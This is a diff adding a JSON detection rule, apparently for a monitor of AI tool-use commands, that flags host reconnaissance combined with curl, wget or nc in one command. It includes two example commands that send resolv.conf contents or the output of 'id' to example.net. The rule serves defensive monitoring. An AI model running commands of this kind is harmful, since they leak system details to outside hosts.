@@ -1,0 +1,19 @@
+{
+  "specVersion": 1,
+  "id": "command-risk/recon-then-egress",
+  "name": "Host reconnaissance and a network transfer in one command",
+  "category": "custom",
+  "severity": "medium",
+  "matcher": {
+    "type": "regex",
+    "pattern": "\\b(?=(?:cat|which|ls|uname|id|hostname)\\b)(?<=(?:^|[;&|({\\x60'\"]|\\$\\()[ \\t]*(?:(?:sudo|doas|command|exec|nohup|time)[ \\t]+(?:-[A-Za-z]{1,8}[ \\t]+){0,3})?(?:[\\w.~-]*/){0,8})(?:cat[ \\t]+/etc/resolv\\.conf(?![\\w.-])|which(?:[ \\t]+-a)?(?:[ \\t]+[\\w.+-]{1,30}){0,8}?[ \\t]+(?:curl|wget|ncat|nc)\\b|ls[ \\t]+-[A-Za-z]{0,6}a[A-Za-z]{0,6}[ \\t]+/tmp(?![\\w.-]|/\\w)|uname[ \\t]+-[A-Za-z]{0,6}a[A-Za-z]{0,6}(?![\\w-])|(?:id|hostname)(?=[ \\t]*(?:$|[;&|)\\x60\\n'\"])))(?=[\\s\\S]{0,1000}?\\b(?=(?:curl|wget|ncat|nc)\\b)(?<=(?:^|[;&|({\\x60'\"]|\\$\\()[ \\t]*(?:(?:sudo|doas|command|exec|nohup|time)[ \\t]+(?:-[A-Za-z]{1,8}[ \\t]+){0,3})?(?:[\\w.~-]*/){0,8})(?:curl|wget|ncat|nc)\\b)|\\b(?=(?:curl|wget|ncat|nc)\\b)(?<=(?:^|[;&|({\\x60'\"]|\\$\\()[ \\t]*(?:(?:sudo|doas|command|exec|nohup|time)[ \\t]+(?:-[A-Za-z]{1,8}[ \\t]+){0,3})?(?:[\\w.~-]*/){0,8})(?:curl|wget|ncat|nc)\\b(?=[\\s\\S]{0,1000}?\\b(?=(?:cat|which|ls|uname|id|hostname)\\b)(?<=(?:^|[;&|({\\x60'\"]|\\$\\()[ \\t]*(?:(?:sudo|doas|command|exec|nohup|time)[ \\t]+(?:-[A-Za-z]{1,8}[ \\t]+){0,3})?(?:[\\w.~-]*/){0,8})(?:cat[ \\t]+/etc/resolv\\.conf(?![\\w.-])|which(?:[ \\t]+-a)?(?:[ \\t]+[\\w.+-]{1,30}){0,8}?[ \\t]+(?:curl|wget|ncat|nc)\\b|ls[ \\t]+-[A-Za-z]{0,6}a[A-Za-z]{0,6}[ \\t]+/tmp(?![\\w.-]|/\\w)|uname[ \\t]+-[A-Za-z]{0,6}a[A-Za-z]{0,6}(?![\\w-])|(?:id|hostname)(?=[ \\t]*(?:$|[;&|)\\x60\\n'\"]))))",
+    "flags": "gm"
+  },
+  "examples": [
+    "cat /etc/resolv.conf; curl -s -X PUT --data-binary x http://example.net/u",
+    "curl -s http://example.net/c -d \"$(id)\""
+  ],
+  "appliesTo": {
+    "eventKinds": ["tool_use"]
+  }
+}
